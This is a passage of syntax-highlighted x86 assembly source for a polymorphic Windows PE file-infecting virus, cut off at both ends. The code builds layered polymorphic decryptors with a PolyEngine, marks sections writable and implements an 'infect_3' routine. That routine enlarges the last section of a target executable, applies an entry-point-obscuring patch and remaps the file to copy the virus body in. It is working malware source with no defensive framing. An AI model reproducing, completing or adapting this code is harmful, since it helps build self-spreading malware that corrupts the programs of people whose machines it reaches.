                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.poly_decryptor_base</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.poly_entry_offset</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.ptrVirusBuffer</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.poly_code_entry_offset</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> 
                    
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.poly_decryptor_base</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; add size of decryptor</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.poly_decryptor_base_va</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; add size of decryptor</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.poly_code_size</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; add size of decryptor</span><span class="sc0">
            
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">CreateLayer</span><span class="sc0"> 
</span><span class="sc5">@@</span><span class="sc4">:</span><span class="sc0">

            </span><span class="sc1">;----------------------------------------------------------;</span><span class="sc0">
            </span><span class="sc1">;        Create On-Top Decryptor               ; </span><span class="sc0">
            </span><span class="sc1">;----------------------------------------------------------;</span><span class="sc0">
                </span><span class="sc1">; this decryptor will move code in memory </span><span class="sc0">
                </span><span class="sc1">;---------------------------------------------------;</span><span class="sc0">
                </span><span class="sc1">;   Find section to which virus will be decrypted   ; </span><span class="sc0">
                </span><span class="sc1">;---------------------------------------------------;</span><span class="sc0">
                </span><span class="sc1">;   find first section big enough to store virus </span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.number_of_sect</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">    </span><span class="sc1">; skip last section</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.ptr_sect_headers</span><span class="sc0">
                
</span><span class="sc5">find_writ_loop</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0"> </span><span class="sc1">; skip first section </span><span class="sc0">
                </span><span class="sc1">; is big enough ?</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.dwVirusSize</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">AlignVal</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                    
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; virtual size</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">found_section</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">find_writ_loop</span><span class="sc0"> 
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">@f</span><span class="sc0"> 

                </span><span class="sc1">;  set writable flag </span><span class="sc0">
</span><span class="sc5">found_section</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">36</span><span class="sc4">],</span><span class="sc2">80000000h</span><span class="sc0"> </span><span class="sc1">; characteristic set writable flag  </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; virtual address</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.ptr_opt_header</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">28</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; image_base </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.poly_ptr_decrypt_buf_va</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.virus_state_flags</span><span class="sc4">,</span><span class="sc5">VIRUS_STATE_MAKE_LAST_WRITABLE</span><span class="sc0"> 

</span><span class="sc5">@@</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> 

                </span><span class="sc1">; resetup poly decryptor_base_va </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.poly_decryptor_base</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.ptrVirusBuffer</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.poly_decryptor_base_va</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> 
 
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.poly_ptr_code_base_va</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc1">;= virus buffer base VA</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.poly_garbage_level</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.poly_options</span><span class="sc4">,</span><span class="sc5">POLY_OPT_POS_INDEPENDENT</span><span class="sc0"> </span><span class="sc1">;OR POLY_OPT_USE_SUBROUTINES ;OR POLY_OPT_MEM_ACC_DIRECT</span><span class="sc0">
                    
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0"> 
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">PolyEngine</span><span class="sc0">
                </span><span class="sc1">; count virus size</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.poly_code_size</span><span class="sc0"> </span><span class="sc1">; eax = code_size + decryptor size </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.dwVirusSize</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                    
                </span><span class="sc1">; count virus entry va</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.poly_decryptor_base</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.poly_entry_offset</span><span class="sc0"> 
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.ptrVirusBuffer</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc1">; eax = relative entry + virus base va</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.VirusEntryVa</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> 
            
</span><span class="sc1">;               mov edx,dword ptr [ebx].poly_decryptor_base</span><span class="sc0">
</span><span class="sc1">;               add edx,dword ptr [ebx].poly_entry_offset</span><span class="sc0">
</span><span class="sc1">;               call edx </span><span class="sc0">
                
</span><span class="sc1">;               add eax,VIRUS_SIZE + 20</span><span class="sc0">
</span><span class="sc1">;               mov dword ptr [ebp].VirusEntryVa,eax </span><span class="sc0">
                
             
</span><span class="sc1">;               loop PreparePolLayer  </span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc9">sizeof</span><span class="sc0"> </span><span class="sc5">poly_vars</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> 
                </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">:</span><span class="sc10">nothing</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1ch</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">  
                    
</span><span class="sc5">PrepareFail</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">retn</span><span class="sc0">  
                    
                                
</span><span class="sc1">;---------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;                    infect_3 - enlarge last section                        ; </span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">; infection type 1 - append section </span><span class="sc0">
</span><span class="sc1">;           type 2 - if reloc is last - enlarge , mov reloc , put virus  (rgb style) </span><span class="sc0">
</span><span class="sc1">;           type 3 - enlarge last section - impemented in this viry </span><span class="sc0">
</span><span class="sc1">;           type 4 - infect pading cavities</span><span class="sc0">

</span><span class="sc1">; __in  : eax = ptr mapped module</span><span class="sc0">
</span><span class="sc1">; __in  : ebx = ptr filename </span><span class="sc0">
</span><span class="sc1">; __out : eax = 0 -&gt; infection failed </span><span class="sc0">
</span><span class="sc1">;         eax = 1 -&gt; infection successfull</span><span class="sc0">
</span><span class="sc5">infect_3</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_last_sec</span><span class="sc0">
                
                </span><span class="sc1">; pick smaller</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; size of raw data</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc10">@f</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc10">@f</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; virtual_size </span><span class="sc0">
                
</span><span class="sc5">@@</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.ptr_opt_header</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">28</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; image_base </span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; virtual address </span><span class="sc0">
                
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">polymorph_virus</span><span class="sc0">
                
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.VirusEntryVa</span><span class="sc0"> </span><span class="sc1">; is raw at this stage </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.decryptor_ep_VA</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
                
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.number_of_epo_patches</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">do_epo_patch_2</span><span class="sc0">
                </span><span class="sc1">; if zero patches occured , file is either infected or not suitable </span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.number_of_epo_patches</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">infect_3_fail</span><span class="sc0"> 
 
                </span><span class="sc1">; okey file is suitable and epo patch is allready applied </span><span class="sc0">
                </span><span class="sc1">; remap file and put virus body to appropriate place </span><span class="sc0">
                 
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc1">; get size of file</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.hFile</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.aGetFileSize</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            
                </span><span class="sc1">; align virus_size to file alignment</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.dwVirusSize</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.ptr_opt_header</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">36</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; file alignment</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">AlignVal</span><span class="sc0">
            
                </span><span class="sc1">; remap file with increased size </span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">UnmapFile</span><span class="sc0">
                
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc1">; file size </span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; filename </span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MapFile</span><span class="sc0"> 
                
                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">InfectFail</span><span class="sc0"> </span><span class="sc1">; file mapping failed</span><span class="sc0">
                    
                </span><span class="sc1">; setup ptr_opt_header in case the image was mapped to different memory</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0">                    </span><span class="sc1">; sizeof IMAGE_NT_HEADER + SIGN</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.ptr_opt_header</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> 
                 
                </span><span class="sc1">; find last section </span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_last_sec</span><span class="sc0">
        
                </span><span class="sc1">; set writable flag</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.virus_state_flags</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">VIRUS_STATE_MAKE_LAST_WRITABLE</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> 
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc10">@f</span><span class="sc0">  
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">36</span><span class="sc4">],</span><span class="sc2">80000000h</span><span class="sc0">
</span><span class="sc5">@@</span><span class="sc4">:</span><span class="sc0">             
                </span><span class="sc1">; pick smaller value virtual_size/raw_size</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; size of raw data</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; sometimes 0 virtual_size occur</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc10">@f</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">    </span><span class="sc1">; virtual_size</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc10">@f</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0"> 
                
</span><span class="sc5">@@</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; pointer to raw data</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.ptrMappedImage</span><span class="sc0"> </span><span class="sc1">; add mapped_image_base</span><span class="sc0">
            
                </span><span class="sc1">; copy virus body</span><span class="sc0">
